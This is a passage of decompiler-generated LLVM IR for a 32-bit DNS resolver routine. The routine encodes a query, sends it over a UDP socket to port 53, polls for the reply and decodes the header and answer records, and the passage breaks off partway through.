  %v0_805575e = load i32, i32* @esp, align 4
  %v0_8055761 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055761 = add i32 %v0_805575e, 8
  %v3_8055761 = inttoptr i32 %v2_8055761 to i32*
  store i32 %v0_8055761, i32* %v3_8055761, align 4
  %v1_8055762 = load i32, i32* @ebx, align 4
  %v2_8055762 = add i32 %v1_8055762, %v2_805554a
  %v2_8055766 = add i32 %v0_805575e, 4
  %v3_8055766 = inttoptr i32 %v2_8055766 to i32*
  store i32 %v2_8055762, i32* %v3_8055766, align 4
  %v1_8055767 = add i32 %v0_805575e, 216
  store i32 %v1_8055767, i32* @eax, align 4
  %v3_805576e = inttoptr i32 %v0_805575e to i32*
  store i32 %v1_8055767, i32* %v3_805576e, align 4
  %v0_805576f = call i32 @__encode_question()
  store i32 %v0_805576f, i32* %eax.global-to-local, align 4
  %v0_8055774 = load i32, i32* @esp, align 4
  %v2_8055777 = icmp slt i32 %v0_805576f, 0
  store i32 %v0_805576f, i32* @esi, align 4
  br i1 %v2_8055777, label %dec_label_pc_8055bdd, label %dec_label_pc_8055781

dec_label_pc_8055781:                             ; preds = %dec_label_pc_8055722
  %v1_8055781 = add i32 %v0_8055774, 172
  %v2_8055781 = inttoptr i32 %v1_8055781 to i16*
  store i16 2, i16* %v2_8055781, align 2
  %v1_805578b = load i32, i32* @esp, align 4
  %v2_805578b = add i32 %v1_805578b, -4
  %v3_805578b = inttoptr i32 %v2_805578b to i32*
  store i32 %v0_805576f, i32* %v3_805578b, align 4
  %v1_805578c = add i32 %v1_805578b, 164
  store i32 %v1_805578c, i32* %eax.global-to-local, align 4
  %v2_8055793 = add i32 %v1_805578b, -8
  %v3_8055793 = inttoptr i32 %v2_8055793 to i32*
  store i32 %v1_805578c, i32* %v3_8055793, align 4
  %v1_8055794 = add i32 %v1_805578b, 32
  %v2_8055794 = inttoptr i32 %v1_8055794 to i32*
  %v3_8055794 = load i32, i32* %v2_8055794, align 4
  %v5_8055794 = add i32 %v1_805578b, -12
  %v6_8055794 = inttoptr i32 %v5_8055794 to i32*
  store i32 %v3_8055794, i32* %v6_8055794, align 4
  %v1_8055798 = add i32 %v1_805578b, -16
  %v2_8055798 = inttoptr i32 %v1_8055798 to i32*
  store i32 10, i32* %v2_8055798, align 4
  %v5_805579a = call i32 @inet_pton(i32 -1, i8* %v4_805579a, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805579a, i32* %eax.global-to-local, align 4
  %v0_805579f = load i32, i32* @esp, align 4
  %v1_805579f = add i32 %v0_805579f, 16
  %tmp47 = icmp slt i32 %v5_805579a, 1
  br i1 %tmp47, label %dec_label_pc_80557b0, label %dec_label_pc_80557a6

dec_label_pc_80557a6:                             ; preds = %dec_label_pc_8055781
  %v1_80557a6 = add i32 %v0_805579f, 172
  %v2_80557a6 = inttoptr i32 %v1_80557a6 to i16*
  store i16 10, i16* %v2_80557a6, align 2
  %v0_80557b0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80557b0

dec_label_pc_80557b0:                             ; preds = %dec_label_pc_8055781, %dec_label_pc_80557a6
  %v0_80557c7 = phi i32 [ %v1_805579f, %dec_label_pc_8055781 ], [ %v0_80557b0.pre, %dec_label_pc_80557a6 ]
  %v1_80557b0 = add i32 %v0_80557c7, 156
  %v2_80557b0 = inttoptr i32 %v1_80557b0 to i16*
  %v3_80557b0 = load i16, i16* %v2_80557b0, align 2
  %v12_80557b0 = icmp eq i16 %v3_80557b0, 10
  %v1_80557b9 = icmp eq i1 %v12_80557b0, false
  %v1_80557c7 = add i32 %v0_80557c7, 158
  %v2_80557c7 = inttoptr i32 %v1_80557c7 to i16*
  store i16 13568, i16* %v2_80557c7, align 2
  %v0_80557d1 = load i32, i32* @esp, align 4
  br i1 %v1_80557b9, label %dec_label_pc_80557c7, label %dec_label_pc_80557e7

dec_label_pc_80557c7:                             ; preds = %dec_label_pc_80557b0
  %v1_80557d4 = add i32 %v0_80557d1, 32
  %v2_80557d4 = inttoptr i32 %v1_80557d4 to i32*
  %v3_80557d4 = load i32, i32* %v2_80557d4, align 4
  %v5_80557d4 = add i32 %v0_80557d1, -16
  %v6_80557d4 = inttoptr i32 %v5_80557d4 to i32*
  store i32 %v3_80557d4, i32* %v6_80557d4, align 4
  %v1_80557d8 = call i32 @inet_addr(i32 -1)
  store i32 %v1_80557d8, i32* %eax.global-to-local, align 4
  %v1_80557dd = load i32, i32* @esp, align 4
  %v2_80557dd = add i32 %v1_80557dd, 176
  %v3_80557dd = inttoptr i32 %v2_80557dd to i32*
  store i32 %v1_80557d8, i32* %v3_80557dd, align 4
  %v0_80557e4 = load i32, i32* @esp, align 4
  %v1_80557e4 = add i32 %v0_80557e4, 16
  br label %dec_label_pc_80557e7

dec_label_pc_80557e7:                             ; preds = %dec_label_pc_80557b0, %dec_label_pc_80557c7
  %v1_80557e7 = phi i32 [ %v1_80557e4, %dec_label_pc_80557c7 ], [ %v0_80557d1, %dec_label_pc_80557b0 ]
  %v0_80557e7 = load i32, i32* @ecx, align 4
  %v2_80557e7 = add i32 %v1_80557e7, -4
  %v3_80557e7 = inttoptr i32 %v2_80557e7 to i32*
  store i32 %v0_80557e7, i32* %v3_80557e7, align 4
  %v1_80557e8 = add i32 %v1_80557e7, -8
  %v2_80557e8 = inttoptr i32 %v1_80557e8 to i32*
  store i32 17, i32* %v2_80557e8, align 4
  %v1_80557ea = add i32 %v1_80557e7, -12
  %v2_80557ea = inttoptr i32 %v1_80557ea to i32*
  store i32 2, i32* %v2_80557ea, align 4
  %v1_80557ec = add i32 %v1_80557e7, 156
  %v2_80557ec = inttoptr i32 %v1_80557ec to i16*
  %v3_80557ec = load i16, i16* %v2_80557ec, align 2
  %v4_80557ec = zext i16 %v3_80557ec to i32
  store i32 %v4_80557ec, i32* %eax.global-to-local, align 4
  %v2_80557f4 = add i32 %v1_80557e7, -16
  %v3_80557f4 = inttoptr i32 %v2_80557f4 to i32*
  store i32 %v4_80557ec, i32* %v3_80557f4, align 4
  %v3_80557f5 = call i32 @socket(i32 -1, i32 %v15_80555d8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80557f5, i32* %eax.global-to-local, align 4
  %v1_80557fa = load i32, i32* @esp, align 4
  %v2_80557fa = add i32 %v1_80557fa, 36
  %v3_80557fa = inttoptr i32 %v2_80557fa to i32*
  store i32 %v3_80557f5, i32* %v3_80557fa, align 4
  %v0_80557fe = load i32, i32* @esp, align 4
  %v1_80557fe = add i32 %v0_80557fe, 16
  %v0_8055801 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055801 = icmp slt i32 %v0_8055801, 0
  br i1 %v2_8055801, label %dec_label_pc_805582e, label %dec_label_pc_8055805

dec_label_pc_8055805:                             ; preds = %dec_label_pc_80557e7
  %v1_8055805 = add i32 %v0_80557fe, 172
  store i32 %v1_8055805, i32* %eax.global-to-local, align 4
  %v0_805580c = load i32, i32* @edx, align 4
  %v2_805580c = add i32 %v0_80557fe, 12
  %v3_805580c = inttoptr i32 %v2_805580c to i32*
  store i32 %v0_805580c, i32* %v3_805580c, align 4
  %v1_805580d = add i32 %v0_80557fe, 8
  %v2_805580d = inttoptr i32 %v1_805580d to i32*
  store i32 28, i32* %v2_805580d, align 4
  %v0_805580f = load i32, i32* %eax.global-to-local, align 4
  %v2_805580f = add i32 %v0_80557fe, 4
  %v3_805580f = inttoptr i32 %v2_805580f to i32*
  store i32 %v0_805580f, i32* %v3_805580f, align 4
  %v1_8055810 = add i32 %v0_80557fe, 36
  %v2_8055810 = inttoptr i32 %v1_8055810 to i32*
  %v3_8055810 = load i32, i32* %v2_8055810, align 4
  %v6_8055810 = inttoptr i32 %v0_80557fe to i32*
  store i32 %v3_8055810, i32* %v6_8055810, align 4
  %v3_8055814 = call i32 @__libc_connect(i32 -1, i32 %v15_80555d8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8055814, i32* %eax.global-to-local, align 4
  %v0_8055819 = load i32, i32* @esp, align 4
  %v2_805581c = icmp slt i32 %v3_8055814, 0
  %v1_805581e = icmp eq i1 %v2_805581c, false
  br i1 %v1_805581e, label %dec_label_pc_8055837, label %dec_label_pc_8055820

dec_label_pc_8055820:                             ; preds = %dec_label_pc_8055805
  %v1_8055820 = call i32 @__errno_location(i32 -1)
  store i32 %v1_8055820, i32* %eax.global-to-local, align 4
  %v1_8055825 = inttoptr i32 %v1_8055820 to i32*
  %v2_8055825 = load i32, i32* %v1_8055825, align 4
  %v11_8055825 = icmp eq i32 %v2_8055825, 101
  %v0_8055b97.pre = load i32, i32* @esp, align 4
  br i1 %v11_8055825, label %dec_label_pc_8055b97, label %dec_label_pc_805582e

dec_label_pc_805582e:                             ; preds = %dec_label_pc_8055820, %dec_label_pc_80557e7
  %v17_805582e = phi i32 [ %v1_80557fe, %dec_label_pc_80557e7 ], [ %v0_8055b97.pre, %dec_label_pc_8055820 ]
  %v1_805582e = add i32 %v17_805582e, 28
  %v2_805582e = inttoptr i32 %v1_805582e to i32*
  %v3_805582e = load i32, i32* %v2_805582e, align 4
  %v4_805582e = add i32 %v3_805582e, 1
  store i32 %v4_805582e, i32* %v2_805582e, align 4
  br label %dec_label_pc_8055bb8.backedge

dec_label_pc_8055837:                             ; preds = %dec_label_pc_8055805
  %v1_8055837 = add i32 %v0_8055819, 12
  %v2_8055837 = inttoptr i32 %v1_8055837 to i32*
  store i32 0, i32* %v2_8055837, align 4
  %v0_8055839 = load i32, i32* @ebx, align 4
  %v1_8055839 = load i32, i32* @esi, align 4
  %v2_8055839 = add i32 %v1_8055839, %v0_8055839
  store i32 %v2_8055839, i32* %eax.global-to-local, align 4
  %v2_805583c = add i32 %v0_8055819, 8
  %v3_805583c = inttoptr i32 %v2_805583c to i32*
  store i32 %v2_8055839, i32* %v3_805583c, align 4
  %v2_805583d = add i32 %v0_8055819, 4
  %v3_805583d = inttoptr i32 %v2_805583d to i32*
  store i32 %v2_805554a, i32* %v3_805583d, align 4
  %v1_805583e = add i32 %v0_8055819, 36
  %v2_805583e = inttoptr i32 %v1_805583e to i32*
  %v3_805583e = load i32, i32* %v2_805583e, align 4
  %v6_805583e = inttoptr i32 %v0_8055819 to i32*
  store i32 %v3_805583e, i32* %v6_805583e, align 4
  %v4_8055842 = call i32 @__libc_send(i32 -1, i32 %v15_80555d8, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8055842, i32* %eax.global-to-local, align 4
  %v0_8055847 = load i32, i32* @esp, align 4
  %v1_8055847 = add i32 %v0_8055847, 36
  %v2_8055847 = inttoptr i32 %v1_8055847 to i32*
  %v3_8055847 = load i32, i32* %v2_8055847, align 4
  store i32 %v3_8055847, i32* %eax.global-to-local, align 4
  %v1_805584b = add i32 %v0_8055847, 232
  %v2_805584b = inttoptr i32 %v1_805584b to i16*
  store i16 1, i16* %v2_805584b, align 2
  %v0_8055855 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055855 = load i32, i32* @esp, align 4
  %v2_8055855 = add i32 %v1_8055855, 228
  %v3_8055855 = inttoptr i32 %v2_8055855 to i32*
  store i32 %v0_8055855, i32* %v3_8055855, align 4
  %v0_805585c = load i32, i32* @esp, align 4
  %v1_805585f = add i32 %v0_805585c, 8
  %v2_805585f = inttoptr i32 %v1_805585f to i32*
  store i32 10000, i32* %v2_805585f, align 4
  %v1_8055864 = add i32 %v0_805585c, 4
  %v2_8055864 = inttoptr i32 %v1_8055864 to i32*
  store i32 1, i32* %v2_8055864, align 4
  %v1_8055866 = add i32 %v0_805585c, 228
  store i32 %v1_8055866, i32* %eax.global-to-local, align 4
  %v3_805586d = inttoptr i32 %v0_805585c to i32*
  store i32 %v1_8055866, i32* %v3_805586d, align 4
  %v0_805586e = call i32 @__libc_poll()
  store i32 %v0_805586e, i32* %eax.global-to-local, align 4
  %v0_8055873 = load i32, i32* @esp, align 4
  %v1_8055873 = add i32 %v0_8055873, 16
  %tmp48 = icmp slt i32 %v0_805586e, 1
  br i1 %tmp48, label %dec_label_pc_8055b97, label %dec_label_pc_805587e

dec_label_pc_805587e:                             ; preds = %dec_label_pc_8055837
  %v1_805587e = add i32 %v0_8055873, 12
  %v2_805587e = inttoptr i32 %v1_805587e to i32*
  store i32 0, i32* %v2_805587e, align 4
  %v1_8055880 = add i32 %v0_8055873, 8
  %v2_8055880 = inttoptr i32 %v1_8055880 to i32*
  store i32 512, i32* %v2_8055880, align 4
  %v2_8055885 = add i32 %v0_8055873, 4
  %v3_8055885 = inttoptr i32 %v2_8055885 to i32*
  store i32 %v2_805554a, i32* %v3_8055885, align 4
  %v1_8055886 = add i32 %v0_8055873, 36
  %v2_8055886 = inttoptr i32 %v1_8055886 to i32*
  %v3_8055886 = load i32, i32* %v2_8055886, align 4
  %v6_8055886 = inttoptr i32 %v0_8055873 to i32*
  store i32 %v3_8055886, i32* %v6_8055886, align 4
  %v4_805588a = call i32 @__libc_recv(i32 -1, i32 %v15_80555d8, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805588a, i32* @eax, align 4
  %v1_805588f = load i32, i32* @esp, align 4
  %v2_805588f = add i32 %v1_805588f, 32
  %v3_805588f = inttoptr i32 %v2_805588f to i32*
  store i32 %v4_805588a, i32* %v3_805588f, align 4
  %v0_8055893 = load i32, i32* @esp, align 4
  %v1_8055893 = add i32 %v0_8055893, 16
  %v7_8055899 = icmp sgt i32 %v4_805588a, 11
  br i1 %v7_8055899, label %dec_label_pc_805589f, label %dec_label_pc_8055b4c

dec_label_pc_805589f:                             ; preds = %dec_label_pc_805587e
  %v0_805589f = load i32, i32* @ebx, align 4
  %v2_805589f = add i32 %v0_8055893, 12
  %v3_805589f = inttoptr i32 %v2_805589f to i32*
  store i32 %v0_805589f, i32* %v3_805589f, align 4
  %v0_80558a0 = load i32, i32* @ebx, align 4
  %v2_80558a0 = add i32 %v0_8055893, 8
  %v3_80558a0 = inttoptr i32 %v2_80558a0 to i32*
  store i32 %v0_80558a0, i32* %v3_80558a0, align 4
  %v1_80558a1 = add i32 %v0_8055893, 84
  store i32 %v1_80558a1, i32* %eax.global-to-local, align 4
  %v2_80558a5 = add i32 %v0_8055893, 4
  %v3_80558a5 = inttoptr i32 %v2_80558a5 to i32*
  store i32 %v1_80558a1, i32* %v3_80558a5, align 4
  %v3_80558a6 = inttoptr i32 %v0_8055893 to i32*
  store i32 %v2_805554a, i32* %v3_80558a6, align 4
  %v0_80558a7 = call i32 @__decode_header()
  store i32 %v0_80558a7, i32* %eax.global-to-local, align 4
  %v0_80558ac = load i32, i32* @esp, align 4
  %v1_80558ac = add i32 %v0_80558ac, 84
  %v2_80558ac = inttoptr i32 %v1_80558ac to i32*
  %v3_80558ac = load i32, i32* %v2_80558ac, align 4
  store i32 %v3_80558ac, i32* %edx.global-to-local, align 4
  %v2_80558b0 = add i32 %v0_80558ac, 60
  %v3_80558b0 = inttoptr i32 %v2_80558b0 to i32*
  store i32 %v3_80558ac, i32* %v3_80558b0, align 4
  %v0_80558b4 = load i32, i32* @esp, align 4
  %v1_80558b4 = add i32 %v0_80558b4, 16
  %v1_80558b7 = add i32 %v0_80558b4, 72
  %v2_80558b7 = inttoptr i32 %v1_80558b7 to i32*
  %v3_80558b7 = load i32, i32* %v2_80558b7, align 4
  store i32 %v3_80558b7, i32* @eax, align 4
  %v0_80558bb = load i32, i32* %edx.global-to-local, align 4
  %v12_80558bb = icmp eq i32 %v0_80558bb, %v3_80558b7
  %v1_80558bd = icmp eq i1 %v12_80558bb, false
  br i1 %v1_80558bd, label %dec_label_pc_8055b4c, label %dec_label_pc_80558c3

dec_label_pc_80558c3:                             ; preds = %dec_label_pc_805589f
  %v1_80558c3 = add i32 %v0_80558b4, 88
  %v2_80558c3 = inttoptr i32 %v1_80558c3 to i32*
  %v3_80558c3 = load i32, i32* %v2_80558c3, align 4
  %v4_80558c3 = icmp eq i32 %v3_80558c3, 0
  br i1 %v4_80558c3, label %dec_label_pc_8055b4c, label %dec_label_pc_80558ce

dec_label_pc_80558ce:                             ; preds = %dec_label_pc_80558c3
  %v1_80558ce = add i32 %v0_80558b4, 112
  %v2_80558ce = inttoptr i32 %v1_80558ce to i32*
  %v3_80558ce = load i32, i32* %v2_80558ce, align 4
  store i32 %v3_80558ce, i32* @eax, align 4
  %v9_80558d2 = icmp eq i32 %v3_80558ce, 3
  %v1_80558d5 = icmp eq i1 %v9_80558d2, false
  br i1 %v1_80558d5, label %dec_label_pc_805593d, label %dec_label_pc_80558d7

dec_label_pc_80558d7:                             ; preds = %dec_label_pc_80558ce
  %v1_80558d7 = add i32 %v0_80558b4, 67
  %v2_80558d7 = inttoptr i32 %v1_80558d7 to i8*
  %v3_80558d7 = load i8, i8* %v2_80558d7, align 1
  %v4_80558d7 = icmp eq i8 %v3_80558d7, 0
  %v1_80558dc = icmp eq i1 %v4_80558d7, false
  br i1 %v1_80558dc, label %dec_label_pc_805592d, label %dec_label_pc_80558de

dec_label_pc_80558de:                             ; preds = %dec_label_pc_80558d7
  %v0_80558de = load i32, i32* @ecx, align 4
  %v2_80558de = add i32 %v0_80558b4, 12
  %v3_80558de = inttoptr i32 %v2_80558de to i32*
  store i32 %v0_80558de, i32* %v3_80558de, align 4
  %v1_80558df = add i32 %v0_80558b4, 8
  %v2_80558df = inttoptr i32 %v1_80558df to i32*
  store i32 ptrtoint (i32* @global_var_8062548.726 to i32), i32* %v2_80558df, align 4
  %v1_80558e4 = add i32 %v0_80558b4, 4
  %v2_80558e4 = inttoptr i32 %v1_80558e4 to i32*
  store i32 134562299, i32* %v2_80558e4, align 4
  %v1_80558e9 = add i32 %v0_80558b4, 200
  store i32 %v1_80558e9, i32* @esi, align 4
  %v3_80558f0 = inttoptr i32 %v0_80558b4 to i32*
  store i32 %v1_80558e9, i32* %v3_80558f0, align 4
  %v2_80558f1 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80555d8)
  store i32 %v2_80558f1, i32* %eax.global-to-local, align 4
  %v0_80558f6 = load i32, i32* @esp, align 4
  %v1_80558f6 = inttoptr i32 %v0_80558f6 to i32*
  store i32 ptrtoint (i32* @global_var_8062548.726 to i32), i32* %v1_80558f6, align 4
  %v1_80558fd = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_80558fd, i32* %eax.global-to-local, align 4
  %v0_8055902 = load i32, i32* @global_var_8068c38.790, align 8
  store i32 %v0_8055902, i32* %ebx.global-to-local, align 4
  %v0_8055908 = load i32, i32* @esp, align 4
  %v1_8055908 = inttoptr i32 %v0_8055908 to i32*
  %v2_8055908 = load i32, i32* %v1_8055908, align 4
  store i32 %v2_8055908, i32* @eax, align 4
  %v3_8055908 = add i32 %v0_8055908, 4
  %v1_8055909 = inttoptr i32 %v3_8055908 to i32*
  %v2_8055909 = load i32, i32* %v1_8055909, align 4
  store i32 %v2_8055909, i32* %edx.global-to-local, align 4
  %v1_805590a = add i32 %v0_8055902, -1
  store i32 %v1_805590a, i32* @ebx, align 4
  store i32 1, i32* %v1_8055909, align 4
  %v0_805590d = load i32, i32* @esi, align 4
  store i32 %v0_805590d, i32* %v1_8055908, align 4
  %v2_805590e = call i32 @__pthread_return_void(i32 -1, i32 %v15_80555d8)
  store i32 %v2_805590e, i32* %eax.global-to-local, align 4
  %v0_8055913 = load i32, i32* @esp, align 4
  %v1_8055916 = add i32 %v0_8055913, 52
  %v2_8055916 = inttoptr i32 %v1_8055916 to i32*
  %v3_8055916 = load i32, i32* %v2_8055916, align 4
  %v4_8055916 = load i32, i32* @ebx, align 4
  %v5_8055916 = sub i32 %v3_8055916, %v4_8055916
  %v11_8055916 = xor i32 %v4_8055916, %v3_8055916
  %v12_8055916 = xor i32 %v5_8055916, %v3_8055916
  %v13_8055916 = and i32 %v12_8055916, %v11_8055916
  %v14_8055916 = icmp slt i32 %v13_8055916, 0
  %v16_8055916 = icmp slt i32 %v5_8055916, 0
  %v2_805591a = icmp eq i1 %v16_8055916, %v14_8055916
  br i1 %v2_805591a, label %dec_label_pc_805592d, label %dec_label_pc_805591c

dec_label_pc_805591c:                             ; preds = %dec_label_pc_80558de
  %v1_805591c = add i32 %v0_8055913, 60
  %v2_805591c = inttoptr i32 %v1_805591c to i32*
  %v3_805591c = load i32, i32* %v2_805591c, align 4
  store i32 %v3_805591c, i32* %edx.global-to-local, align 4
  %v3_8055920 = load i32, i32* %v2_8055916, align 4
  %v4_8055920 = add i32 %v3_8055920, 1
  store i32 %v4_8055920, i32* %v2_8055916, align 4
  %v0_8055924 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055924 = load i32, i32* @esp, align 4
  %v2_8055924 = add i32 %v1_8055924, 56
  %v3_8055924 = inttoptr i32 %v2_8055924 to i32*
  store i32 %v0_8055924, i32* %v3_8055924, align 4
  br label %dec_label_pc_8055bb8.backedge

dec_label_pc_805592d:                             ; preds = %dec_label_pc_80558de, %dec_label_pc_80558d7
  %v0_805592d = call i32 @__GI___h_errno_location()
  store i32 %v0_805592d, i32* %eax.global-to-local, align 4
  %v1_8055932 = inttoptr i32 %v0_805592d to i32*
  store i32 1, i32* %v1_8055932, align 4
  br label %dec_label_pc_8055bf0

dec_label_pc_805593d:                             ; preds = %dec_label_pc_80558ce
  %v1_805593d = icmp eq i32 %v3_80558ce, 0
  %v1_805593f = icmp eq i1 %v1_805593d, false
  br i1 %v1_805593f, label %dec_label_pc_8055b4c, label %dec_label_pc_8055945

dec_label_pc_8055945:                             ; preds = %dec_label_pc_805593d
  %v1_8055945 = add i32 %v0_80558b4, 120
  %v2_8055945 = inttoptr i32 %v1_8055945 to i32*
  %v3_8055945 = load i32, i32* %v2_8055945, align 4
  %tmp49 = icmp slt i32 %v3_8055945, 1
  br i1 %tmp49, label %dec_label_pc_8055955, label %dec_label_pc_805594c

dec_label_pc_805594c:                             ; preds = %dec_label_pc_8055945
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8055974

dec_label_pc_8055955:                             ; preds = %dec_label_pc_8055945
  %v0_8055955 = call i32 @__GI___h_errno_location()
  store i32 %v0_8055955, i32* %eax.global-to-local, align 4
  %v1_805595a = inttoptr i32 %v0_8055955 to i32*
  store i32 4, i32* %v1_805595a, align 4
  br label %dec_label_pc_8055bf0

dec_label_pc_8055965:                             ; preds = %dec_label_pc_8055974
  %v2_8055965 = add i32 %v0_805597c, -4
  %v3_8055965 = inttoptr i32 %v2_8055965 to i32*
  store i32 %v0_8055965, i32* %v3_8055965, align 4
  %v0_8055966 = load i32, i32* @ebx, align 4
  %v1_8055966 = add i32 %v0_8055966, 1
  store i32 %v1_8055966, i32* @ebx, align 4
  %v0_8055967 = load i32, i32* @eax, align 4
  %v2_8055967 = add i32 %v0_805597c, -8
  %v3_8055967 = inttoptr i32 %v2_8055967 to i32*
  store i32 %v0_8055967, i32* %v3_8055967, align 4
  %v0_8055968 = load i32, i32* @esi, align 4
  %v2_8055968 = add i32 %v0_805597c, -12
  %v3_8055968 = inttoptr i32 %v2_8055968 to i32*
  store i32 %v0_8055968, i32* %v3_8055968, align 4
  %v2_8055969 = add i32 %v0_805597c, -16
  %v3_8055969 = inttoptr i32 %v2_8055969 to i32*
  store i32 %v2_805554a, i32* %v3_8055969, align 4
  %v0_805596a = call i32 @__length_question()
  store i32 %v0_805596a, i32* @eax, align 4
  %v0_805596f = load i32, i32* @esp, align 4
  %v1_805596f = add i32 %v0_805596f, 16
  %v0_8055972 = load i32, i32* @esi, align 4
  %v2_8055972 = add i32 %v0_8055972, %v0_805596a
  %v0_8055974.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8055974

dec_label_pc_8055974:                             ; preds = %dec_label_pc_805594c, %dec_label_pc_8055965
  %v0_8055965 = phi i32 [ %v3_80558ce, %dec_label_pc_805594c ], [ %v0_805596a, %dec_label_pc_8055965 ]
  %v0_805597c = phi i32 [ %v1_80558b4, %dec_label_pc_805594c ], [ %v1_805596f, %dec_label_pc_8055965 ]
  %v0_8055974 = phi i32 [ 0, %dec_label_pc_805594c ], [ %v0_8055974.pre, %dec_label_pc_8055965 ]
  %storemerge = phi i32 [ 12, %dec_label_pc_805594c ], [ %v2_8055972, %dec_label_pc_8055965 ]
  store i32 %storemerge, i32* @esi, align 4
  %v2_8055974 = add i32 %v0_805597c, 100
  %v3_8055974 = inttoptr i32 %v2_8055974 to i32*
  %v4_8055974 = load i32, i32* %v3_8055974, align 4
  %v5_8055974 = sub i32 %v0_8055974, %v4_8055974
  %v11_8055974 = xor i32 %v4_8055974, %v0_8055974
  %v12_8055974 = xor i32 %v5_8055974, %v0_8055974
  %v13_8055974 = and i32 %v12_8055974, %v11_8055974
  %v14_8055974 = icmp slt i32 %v13_8055974, 0
  %v16_8055974 = icmp slt i32 %v5_8055974, 0
  %v2_8055978 = icmp eq i1 %v16_8055974, %v14_8055974
  br i1 %v2_8055978, label %dec_label_pc_805597a, label %dec_label_pc_8055965

dec_label_pc_805597a:                             ; preds = %dec_label_pc_8055974
  store i32 0, i32* @ebx, align 4
  %v1_805597c = add i32 %v0_805597c, 27
  %v2_805597c = inttoptr i32 %v1_805597c to i8*
  store i8 1, i8* %v2_805597c, align 1
  %v0_8055aaa.pre = load i32, i32* @ebx, align 4
  %v1_8055aaa.pre = load i32, i32* @esp, align 4
  %v2_8055aaa55 = add i32 %v1_8055aaa.pre, 104
  %v3_8055aaa56 = inttoptr i32 %v2_8055aaa55 to i32*
  %v4_8055aaa57 = load i32, i32* %v3_8055aaa56, align 4
  %v5_8055aaa58 = sub i32 %v0_8055aaa.pre, %v4_8055aaa57
  %v11_8055aaa60 = xor i32 %v4_8055aaa57, %v0_8055aaa.pre
  %v12_8055aaa61 = xor i32 %v5_8055aaa58, %v0_8055aaa.pre
  %v13_8055aaa62 = and i32 %v12_8055aaa61, %v11_8055aaa60
  %v14_8055aaa63 = icmp slt i32 %v13_8055aaa62, 0
  %v16_8055aaa65 = icmp slt i32 %v5_8055aaa58, 0
  %v2_8055aae66 = icmp eq i1 %v16_8055aaa65, %v14_8055aaa63
  br i1 %v2_8055aae66, label %dec_label_pc_8055aba, label %dec_label_pc_8055ab0.lr.ph

dec_label_pc_8055ab0.lr.ph:                       ; preds = %dec_label_pc_805597a
  %v0_8055ab0.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8055ab0

dec_label_pc_8055986:                             ; preds = %dec_label_pc_8055ab0
  %v1_8055986 = add i32 %v0_805598667, 116
  store i32 %v1_8055986, i32* %eax.global-to-local, align 4
  %v2_805598a = add i32 %v0_805598667, -4
  %v3_805598a = inttoptr i32 %v2_805598a to i32*
  store i32 %v1_8055986, i32* %v3_805598a, align 4
  %v3_805598b = load i32, i32* %v3_8055ab0, align 4
  %v5_805598b = add i32 %v0_805598667, -8
  %v6_805598b = inttoptr i32 %v5_805598b to i32*
  store i32 %v3_805598b, i32* %v6_805598b, align 4
  %v0_805598f = load i32, i32* @esi, align 4
  %v2_805598f = add i32 %v0_805598667, -12
  %v3_805598f = inttoptr i32 %v2_805598f to i32*
  store i32 %v0_805598f, i32* %v3_805598f, align 4
  %v2_8055990 = add i32 %v0_805598667, -16
  %v3_8055990 = inttoptr i32 %v2_8055990 to i32*
  store i32 %v2_805554a, i32* %v3_8055990, align 4
  %v0_8055991 = call i32 @__decode_answer()
  store i32 %v0_8055991, i32* @eax, align 4
  %v1_8055996 = load i32, i32* @esp, align 4
  %v2_8055996 = add i32 %v1_8055996, 68
  %v3_8055996 = inttoptr i32 %v2_8055996 to i32*
  store i32 %v0_8055991, i32* %v3_8055996, align 4
  %v0_805599a = load i32, i32* @esp, align 4
  %v1_805599a = add i32 %v0_805599a, 16
  %v2_805599d = icmp slt i32 %v0_8055991, 0
  %v1_805599f = icmp eq i1 %v2_805599d, false
  br i1 %v1_805599f, label %dec_label_pc_80559b9, label %dec_label_pc_80559a1

dec_label_pc_80559a1:                             ; preds = %dec_label_pc_8055986
  %v0_80559a1 = load i32, i32* @ebx, align 4
  %v1_80559a1 = icmp eq i32 %v0_80559a1, 0
  br i1 %v1_80559a1, label %dec_label_pc_8055b4c, label %dec_label_pc_80559a9

dec_label_pc_80559a9:                             ; preds = %dec_label_pc_80559a1
  %v1_80559a9 = add i32 %v0_805599a, 100
  %v2_80559a9 = inttoptr i32 %v1_80559a9 to i32*
  %v3_80559a9 = load i32, i32* %v2_80559a9, align 4
  %v4_80559a9 = icmp eq i32 %v3_80559a9, 0
  br i1 %v4_80559a9, label %dec_label_pc_8055b4c, label %dec_label_pc_8055aba

dec_label_pc_80559b9:                             ; preds = %dec_label_pc_8055986
  %v1_80559b9 = add i32 %v0_805599a, 43
  %v2_80559b9 = inttoptr i32 %v1_80559b9 to i8*
  %v3_80559b9 = load i8, i8* %v2_80559b9, align 1
  %v4_80559b9 = icmp eq i8 %v3_80559b9, 0
  br i1 %v4_80559b9, label %dec_label_pc_8055a5a, label %dec_label_pc_80559c4

dec_label_pc_80559c4:                             ; preds = %dec_label_pc_80559b9
  %v0_80559c4 = load i32, i32* @edi, align 4
  %v1_80559c4 = add i32 %v0_80559c4, 28
  %v2_80559c4 = inttoptr i32 %v1_80559c4 to i32*
  %v3_80559c4 = load i32, i32* %v2_80559c4, align 4
  store i32 %v3_80559c4, i32* %eax.global-to-local, align 4
  %v2_80559c7 = add i32 %v0_805599a, 160
  %v3_80559c7 = inttoptr i32 %v2_80559c7 to i32*
  store i32 %v3_80559c4, i32* %v3_80559c7, align 4
  %v0_80559ce = load i32, i32* @edi, align 4
  %v1_80559ce = add i32 %v0_80559ce, 32
  %v2_80559ce = inttoptr i32 %v1_80559ce to i32*
  %v3_80559ce = load i32, i32* %v2_80559ce, align 4
